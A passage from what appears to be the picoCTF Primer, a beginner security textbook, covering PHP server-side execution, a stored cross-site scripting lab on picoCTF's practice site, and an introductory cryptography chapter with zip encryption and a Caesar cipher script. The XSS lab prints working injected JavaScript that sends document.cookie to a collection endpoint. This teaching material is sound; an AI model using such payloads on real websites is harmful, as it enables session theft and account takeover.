                            happen in any programming language, because they are not a fault of the language, but a
                            fault of the programmer that did the website.</p>
                    </div>
                    <div class="paragraph">
                        <p>Suppose you have a text file named hello.php, containing:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">b</span><span class="tok-p">&gt;</span>Hello World!<span class="tok-p">&lt;/</span><span class="tok-nt">b</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span><span class="tok-w"> </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-s1">&#39;Hello World from JavaScript!&#39;</span><span class="tok-p">);</span><span class="tok-w"> </span><span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-cp">&lt;?php</span>
<span class="tok-cp">    echo &quot;Hello World from PHP!&quot;;</span>
<span class="tok-cp">?&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that in a file with the extension .php you can mix html, JavaScript, and PHP code! If
                            the server supports PHP, everything inside <strong>&lt;?php ?&gt;</strong> will be
                            understood as PHP code and run by the server, not by the browser.</p>
                    </div>
                    <div class="paragraph">
                        <p>Look at the following image carefully to understand what happens:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image36.png" alt="image" width="624" height="345">
                        </div>
                        <div class="title">Figure 19. Client to server communication detail</div>
                    </div>
                    <div class="paragraph">
                        <p>If you open a file with that content on your laptop, the PHP code will not be executed,
                            because your laptop is not a PHP server (if you have not made it one). So, to execute PHP
                            you need to make your laptop a server. But for the time being, we can use the following:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_intro" target="_blank"
                                rel="noopener">https://www.w3schools.com/php/phptryit.asp?filename=tryphp_intro</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Access that link, and you will see at the right a file with html and PHP code, that when is
                            run, prints "My first PHP script!". Let&#8217;s modify the code to additionally print the
                            date, so below the line</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="php"><span></span><span class="tok-k">echo</span> <span class="tok-s2">&quot;My first PHP script!&quot;</span><span class="tok-p">;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Add the line</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="php"><span></span><span class="tok-k">echo</span> <span class="tok-nb">date</span><span class="tok-p">(</span><span class="tok-s2">&quot;H:i:s&quot;</span><span class="tok-p">);</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>According to what you have learned so far, that time is from the clock on your computer? Or
                            the time of the clock in the server?</p>
                    </div>
                    <div class="paragraph">
                        <p>&#8230;&#8203;PHP is server side code, so that time is from the clock on the server!</p>
                    </div>
                    <div class="paragraph">
                        <p>Now let&#8217;s make an experiment, and add another line with this php code:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="php"><span></span><span class="tok-k">echo</span> <span class="tok-s2">&quot;&lt;script&gt; alert(&#39;Hello World from JavaScript!&#39;); &lt;/script&gt;&quot;</span><span class="tok-p">;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>That string echoed in PHP has JavaScript code. Is the JavaScript alert shown? What happened?
                            As expected, anything printed on php, will become an integral part of the html downloaded
                            file, so the JavaScript will be executed. This opens the door for the famous attack of Cross
                            Site Scripting (XSS).</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_cross_site_scripting_xss">5.4. Cross Site Scripting (XSS)</h3>
                    <div class="paragraph">
                        <p>After you Login into a Website, the website needs a way to know that any request coming from
                            your browser is coming from a user that previously logged in, without the need to send the
                            user-password again. To do that, the website can send to your browser a secret random value
                            after login. That value is generally stored in a cookie or in JavaScript local storage. For
                            this example, let&#8217;s pretend it is stored in a cookie, which is simply a variable in
                            your browser that can retain data. If a Website sets a specific cookie in your browser, your
                            browser automatically re-sends that cookie in each request to the website. If a website only
                            uses cookies to retain a session, and if a hacker can steal the authentication cookie from
                            you, they could pretend to be you! Note that only using cookies for authentication will open
                            the possibility of Cross Site Request Forgery (CSRF), but this will be explained later, for
                            now let&#8217;s focus on XSS.</p>
                    </div>
                    <div class="paragraph">
                        <p>Suppose you are a hacker in a social network. When you create your account, instead of using
                            your name, you input JavaScript code. When a friend of yours visit your profile, the WebSite
                            will try to print your name, but your name is actually JavaScript code, so the browser might
                            execute that JavaScript code. In that way, you could execute your own JavaScript on your
                            friend&#8217;s browser!</p>
                    </div>
                    <div class="paragraph">
                        <p>When you get to execute JavaScript in someone else&#8217;s browser, you can read their
                            authentication data, which can be a secret value placed on a cookie or JavaScript local
                            storage after a user logs in. At that point, your friend&#8217;s account would probably be
                            compromised!</p>
                    </div>
                    <div class="paragraph">
                        <p>An important skill to have, is to use the browser debugger. For this explanation we will use
                            Firefox. You can download and install Firefox here:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://www.mozilla.org/en-US/firefox/new/" target="_blank"
                                rel="noopener">https://www.mozilla.org/en-US/firefox/new/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Note: If you really don&#8217;t want to use Firefox, every browser has a debugger that you
                            can google how to use it. It will not be that different.</p>
                    </div>
                    <div class="paragraph">
                        <p>Using Firefox, input your name and some text in the description in the following link:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/sign_up.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/sign_up.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Open another tab and visit the following link. You should see your name and description:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/tableusers.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/tableusers.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Now, in the Firefox Menu, click "Web Developer" and then click "Debugger". You should see a
                            pane like the following:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image15.png" alt="image" width="624" height="446">
                        </div>
                        <div class="title">Figure 20. Web Debugger</div>
                    </div>
                    <div class="paragraph">
                        <p>In that pane, click "storage". At the left click "cookies" and click the domain you are
                            currently on. You will see a cookie that has your name in the value!</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image25.png" alt="image" width="624" height="370">
                        </div>
                        <div class="title">Figure 21. Web Debugger - storage</div>
                    </div>
                    <div class="paragraph">
                        <p>You can only see your cookie. Other users would see their cookie with their name. For this
                            experiment, you will steal your own cookie. But with the same method, you could steal the
                            cookie of someone else.</p>
                    </div>
                    <div class="paragraph">
                        <p>For now, access this link again:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/sign_up.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/sign_up.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Create a new user that has your name, but instead of the description has the following code:
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span><span class="tok-w"> </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-s1">&#39;I just injected Javascript!&#39;</span><span class="tok-p">);</span><span class="tok-w"> </span><span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you navigate this link again, you will see your JavaScript code triggered:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/tableusers.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/tableusers.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Like this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image16.png" alt="image" width="624" height="370">
                        </div>
                        <div class="title">Figure 22. JavaScript triggered</div>
                    </div>
                    <div class="paragraph">
                        <p>You just verified that you can inject JavaScript in the website. Now we are going to inject
                            JavaScript that will steal the cookie. Create another user in the same link for creating
                            users:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/sign_up.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/sign_up.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>But now, put this JavaScript code in the description:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="html"><span></span><span class="tok-p">&lt;</span><span class="tok-nt">script</span> <span class="tok-na">src</span><span class="tok-o">=</span><span class="tok-s">&quot;https://code.jquery.com/jquery-3.4.1.min.js&quot;</span><span class="tok-p">&gt;</span><span class="tok-w"> </span><span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-p">&lt;</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span>
<span class="tok-nx">$</span><span class="tok-p">.</span><span class="tok-nx">get</span><span class="tok-p">(</span>
<span class="tok-w">    </span><span class="tok-s2">&quot;https://primer.picoctf.org/vuln/web/insert.php&quot;</span><span class="tok-p">,</span>
<span class="tok-w">    </span><span class="tok-p">{</span><span class="tok-nx">cookie</span><span class="tok-w"> </span><span class="tok-o">:</span><span class="tok-w"> </span><span class="tok-nb">document</span><span class="tok-p">.</span><span class="tok-nx">cookie</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-nx">hackername</span><span class="tok-w"> </span><span class="tok-o">:</span><span class="tok-w"> </span><span class="tok-s1">&#39;YourName&#39;</span><span class="tok-p">},</span>
<span class="tok-w">    </span><span class="tok-kd">function</span><span class="tok-p">(</span><span class="tok-nx">data</span><span class="tok-p">)</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-w">        </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-s2">&quot;I just stole the cookie!&quot;</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-p">}</span>
<span class="tok-p">);</span>
<span class="tok-p">&lt;/</span><span class="tok-nt">script</span><span class="tok-p">&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Let&#8217;s understand the code. The first line, imports a library called jquery:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="javascript"><span></span><span class="tok-o">&lt;</span><span class="tok-nx">script</span><span class="tok-w"> </span><span class="tok-nx">src</span><span class="tok-o">=</span><span class="tok-s2">&quot;https://code.jquery.com/jquery-3.4.1.min.js&quot;</span><span class="tok-o">&gt;</span><span class="tok-w"> </span><span class="tok-o">&lt;</span><span class="tok-err">/script&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>A library is a set of functions that allow us to do some actions in an easier manner. In this
                            case, it allow us to do requests and send data from JavaScript to a server. We are just
                            sending the cookie to a remote service that is made to receive cookies from this exercise.
                            That service receives two variables: "cookie" and "hackername". The value of the variable
                            cookie will be "document.cookie". Here, instead of "=", we use ":" to assign a value to a
                            variable. Using document.cookie you access the cookies from JavaScript, so that should
                            contain the cookie you want to steal. The variable hackername simply has a name assigned.
                            You could replace the string "YourName" with your actual name. Remember that a string must
                            be inside quotes in JavaScript.</p>
                    </div>
                    <div class="paragraph">
                        <p>The function:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="javascript"><span></span><span class="tok-kd">function</span><span class="tok-p">(</span><span class="tok-nx">data</span><span class="tok-p">){</span>
<span class="tok-w">    </span><span class="tok-nx">alert</span><span class="tok-p">(</span><span class="tok-s2">&quot;I just stole the cookie!&quot;</span><span class="tok-p">);</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is simply a function that will be executed after the request is sent to the service, and will
                            alert a message.</p>
                    </div>
                    <div class="paragraph">
                        <p>Now visit this site again:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/tableusers.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/tableusers.php</a></p>
                    </div>
                    <div class="paragraph">
                        <p>When a user visits that site is when the JavaScript is executed and the cookie is stolen. You
                            should see the message:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image14.png" alt="image" width="624" height="380">
                        </div>
                        <div class="title">Figure 23. Alert after stealing cookie</div>
                    </div>
                    <div class="paragraph">
                        <p>If you injected scripts previously, all those scripts are stored in the web site and will be
                            executed in the order you injected them when the page that prints them is visited.</p>
                    </div>
                    <div class="paragraph">
                        <p>Now you should be able to see the cookie you stole here:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://primer.picoctf.org/vuln/web/tablestolen.php" target="_blank"
                                rel="noopener">https://primer.picoctf.org/vuln/web/tablestolen.php</a></p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/image21.png" alt="image" width="624" height="380">
                        </div>
                        <div class="title">Figure 24. Table showing results</div>
                    </div>
                    <div class="paragraph">
                        <p>At this point you should have some understanding on how a website works. You are ready to
                            begin to do more web challenges on the picoCTF!</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_cryptography">6. Cryptography</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_3" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>Cryptography is an ancient field that dates to Ancient Rome. Etymologically, the word traces back
                        to the Greek roots "kryptos" meaning "hidden" and "graphein" meaning "to write." It is used to
                        communicate secretly in the presence of an enemy. With cryptography we can achieve the following
                        properties when a message is sent:</p>
                </div>
                <div class="ulist">
                    <ul>
                        <li>
                            <p>Confidentiality: No one unintended will be able to read the message.</p>
                        </li>
                        <li>
                            <p>Integrity: If a message is tampered, it is possible to detect that it was.</p>
                        </li>
                        <li>
                            <p>Authentication: The identity of a person can be verified accurately.</p>
                        </li>
                        <li>
                            <p>Nonrepudiation: If a person sent a specific message, then the person cannot deny that the
                                message was sent by them.</p>
                        </li>
                    </ul>
                </div>
                <div class="paragraph">
                    <p>First, we will see how to achieve Confidentiality. This is done with encryption. When we want to
                        hide a message, we say that we encrypt the message. To understand how encryption works, we will
                        see an example of an ancient way of encrypting a message that is not secure by any means today,
                        but it is good for illustration. But first, to practice our terminal skills, we will encrypt a
                        folder in linux to prevent anyone from reading its contents without the appropriate password.
                    </p>
                </div>
                <div class="sect2">
                    <h3 id="_practical_example">6.1. Practical example</h3>
                    <div class="paragraph">
                        <p>To use cryptography in real life, you should never use your own implementations. To begin, we
                            will demonstrate how to encrypt a file, without any knowledge in cryptography. Go to the
                            picoCTF webshell at:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://webshell.picoctf.org/" class="bare">https://webshell.picoctf.org/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>When you are there, create a file called 'my_name.txt' containing your name. You could use
                            the 'nano' editor, but in linux it is possible to do the following trick: If your name was
                            'samuel', you would run the following command to create the text file:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>echo &quot;samuel&quot; &gt; my_name.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>The 'echo' command simply outputs a string, and we are redirecting that output to a file. For
                            example, if we just run</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>echo &quot;samuel&quot;</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You will simple see 'samuel' printed on the screen. Now run:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>and you will see the file you created:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls
my_name.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you run the command:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>cat my_name.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>you will see the content:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>cat my_name.txt
samuel</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, create another file with your last name called 'my_lastname.txt'. You can use the same
                            technique to create 'my_lastname.txt':</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>echo &quot;pardo&quot; &gt; my_lastname.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We will move both files to a new folder, then compress that folder, and then encrypt it!
                            Compressing a folder just makes several files or folders to appear as a single file, and
                            they would take less space on disk, but compressing does not provide any security. Anyone
                            would be able to simply decompress it and see the original content. However, encryption will
                            prevent obtaining the original content without the key. To do that experiment, create a
                            directory called my info:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mkdir my_info</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And move both files inside using the command mv (mv means move):</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>mv my_name.txt my_info/
mv my_lastname.txt my_info/</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Navigate to the folder 'my_info' and make sure that it contains the files. Now, come back
                            outside my_info folder, and compress the folder into a zip file by running:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>zip -r my_info.zip my_info/</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that my_info.zip is the name we chose for our compressed file, and '-r' means
                            recursively, which in this case means that we want to compress everything inside the folder.
                            If you run</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the folder and the compressed file:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls
my_info  my_info.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now remove the folder by running:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>rm -r my_info</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>'rm' means remove, and '-r' means recursively and indicates we want to remove everything in
                            the folder:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>rm -r my_info</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, if you run</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>you should see only your compressed file:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls
my_info.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You could easily uncompress the folder by running:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>unzip my_info.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And obtain the original folder:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls
my_info  my_info.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, let&#8217;s create a zip file protected with encryption, so it cannot be uncompressed
                            without a key. In this context, the words 'key' and 'password' are synonyms.</p>
                    </div>
                    <div class="paragraph">
                        <p>Let&#8217;s first remove the .zip file we already created by running:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>rm my_info.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, let&#8217;s create our encrypted zip, by using a password, with the following command:
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>zip --encrypt -r my_protected_info.zip my_info/</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You will be asked to input a password and verify it, so remember the password you use to be
                            able to decrypt it later:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>zip --encrypt -r my_protected_info.zip my_info/
Enter password:
Verify password:
  adding: my_info/ (stored 0%)
  adding: my_info/my_name.txt (stored 0%)
  adding: my_info/my_lastname.txt (stored 0%)</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you run:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>unzip my_protected_info.zip</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>It will ask for the password, and only if you input the correct password, you will get back
                            the original content!</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>Archive:  my_protected_info.zip
   creating: my_info/
[my_protected_info.zip] my_info/my_name.txt password:
 extracting: my_info/my_name.txt
 extracting: my_info/my_lastname.txt</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>It is not possible to obtain the original content without the password because it is used to
                            do operations with the content to obtain the resulting encrypted file. At this point you
                            might have no idea of what happened. There are many algorithms for encryption, that were
                            created since the antique Rome. Old ways of encrypting data are easily broken nowadays. Even
                            relatively new ways of encrypting data are broken easily today. Some of them are considered
                            unbreakable right now, but will be broken in the future. Let&#8217;s begin to understand how
                            encryption works!</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_substitution_ciphers">6.2. Substitution ciphers</h3>
                    <div class="paragraph">
                        <p>"Cipher" means a secret or disguised way of writing a message. It can be thought as the same
                            as encryption. One cipher method invented in the antique Rome and named after the emperor
                            Julius Caesar who used it for his private communication is Caesar&#8217;s cipher. This
                            cipher simply substitutes each of the letters of a word by another one that is a certain
                            number of positions further in the alphabet. That "certain number of positions" is called
                            the shift. For example, if we have the word "hello" and we want to encrypt it using
                            Caesar&#8217;s cipher with a shift of 3, we would replace the 'h' by 'k' because 'k' is 3
                            positions further in the alphabet, the 'e' by 'h' for the same reason, and so on. We called
                            the original text we want to encrypt the cleartext or plaintext. The result of encrypting
                            'hello' using Caesar&#8217;s with a shift of 3, is the following:</p>
                    </div>
                    <div class="paragraph">
                        <p>cleartext &#8594; h e l l o</p>
                    </div>
                    <div class="paragraph">
                        <p>Encrypted text &#8594; k h o o r</p>
                    </div>
                    <div class="paragraph">
                        <p>"Decrypting" means obtaining the clear text from the encrypted text. For Caesar&#8217;s
                            cipher we simply do the same but in reverse; we subtract 3 positions in the alphabet to each
                            letter.</p>
                    </div>
                    <div class="paragraph">
                        <p>Note that when we get to the end of the alphabet after adding positions while encrypting
                            something, we simply overlap the alphabet. For example, to encrypt the letter 'z', we would
                            encrypt it using the letter 'c'.</p>
                    </div>
                    <div class="paragraph">
                        <p>To make sure you understand the decryption, decrypt the following text using Caesar cipher
                            with a shift of 3:</p>
                    </div>
                    <div class="paragraph">
                        <p>s l f r f w i</p>
                    </div>
                    <div class="paragraph">
                        <p>The result is something you probably know. Hint: the first decrypted letter is 'p' .</p>
                    </div>
                    <div class="paragraph">
                        <p>Caesar&#8217;s cipher is a <strong>substitution cipher</strong>, because it replaces each
                            letter by something else. In a substitution cipher, you don&#8217;t necessarily need to
                            replace a letter by another letter. You can use any symbol if you know how to reverse it.
                        </p>
                    </div>
                    <div class="paragraph">
                        <p>To practice, go to the webshell. Once you are there, create a python script using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>nano caesar.py</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We will use a python code that encrypts and decrypts only lowercase letters using Caesar
                            cipher. This is how it looks:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">def</span> <span class="tok-nf">caesar_encrypt</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">):</span>
    <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;&quot;</span>

    <span class="tok-c1"># Go through each character of the text in this for loop</span>
    <span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-nb">len</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">)):</span>

        <span class="tok-c1"># Obtain the ASCII value using ord</span>
        <span class="tok-n">char_position</span> <span class="tok-o">=</span> <span class="tok-nb">ord</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">[</span><span class="tok-n">i</span><span class="tok-p">])</span>

        <span class="tok-c1"># Substract 97 to have a character from 1 to 26</span>
        <span class="tok-n">char_position</span> <span class="tok-o">=</span> <span class="tok-n">char_position</span> <span class="tok-o">-</span> <span class="tok-mi">97</span>

        <span class="tok-c1"># Add 3 to the position, as caesar does</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">char_position</span> <span class="tok-o">+</span> <span class="tok-mi">3</span>

        <span class="tok-c1"># Make sure that the position does not surpass 26 (we wrap around)</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">new_char_position</span> <span class="tok-o">%</span> <span class="tok-mi">26</span>

        <span class="tok-c1"># Convert back to ASCII values</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">new_char_position</span> <span class="tok-o">+</span> <span class="tok-mi">97</span>

        <span class="tok-c1"># Convert ASCII value to character and concatenate it to final result</span>
        <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">result</span> <span class="tok-o">+</span> <span class="tok-nb">chr</span><span class="tok-p">(</span><span class="tok-n">new_char_position</span><span class="tok-p">)</span>

        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
    <span class="tok-k">return</span> <span class="tok-n">result</span>

<span class="tok-k">def</span> <span class="tok-nf">caesar_decrypt</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">):</span>
    <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;&quot;</span>

    <span class="tok-c1"># Go through each character of the text in this for loop</span>
    <span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-nb">len</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">)):</span>

        <span class="tok-c1"># Obtain the ASCII value using ord</span>
        <span class="tok-n">char_position</span> <span class="tok-o">=</span> <span class="tok-nb">ord</span><span class="tok-p">(</span><span class="tok-n">cipher_text</span><span class="tok-p">[</span><span class="tok-n">i</span><span class="tok-p">])</span>

        <span class="tok-c1"># Substract 97 to have a character from 1 to 26</span>
        <span class="tok-n">char_position</span> <span class="tok-o">=</span> <span class="tok-n">char_position</span> <span class="tok-o">-</span> <span class="tok-mi">97</span>

        <span class="tok-c1"># Substract 3 to the position, to get back original position</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">char_position</span> <span class="tok-o">-</span> <span class="tok-mi">3</span>

        <span class="tok-c1"># Make sure that the position does not surpass 26 (we wrap around)</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">new_char_position</span> <span class="tok-o">%</span> <span class="tok-mi">26</span>

        <span class="tok-c1"># Convert back to ASCII values</span>
        <span class="tok-n">new_char_position</span> <span class="tok-o">=</span> <span class="tok-n">new_char_position</span> <span class="tok-o">+</span> <span class="tok-mi">97</span>

        <span class="tok-c1"># Convert ASCII value to character and concatenate it to final result</span>
        <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">result</span> <span class="tok-o">+</span> <span class="tok-nb">chr</span><span class="tok-p">(</span><span class="tok-n">new_char_position</span><span class="tok-p">)</span>

        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
    <span class="tok-k">return</span> <span class="tok-n">result</span>

<span class="tok-n">text</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;picoctf&quot;</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;Plain Text: </span><span class="tok-si">{</span><span class="tok-n">text</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
<span class="tok-n">cipher_text</span> <span class="tok-o">=</span> <span class="tok-n">caesar_encrypt</span><span class="tok-p">(</span><span class="tok-n">text</span><span class="tok-p">)</span>
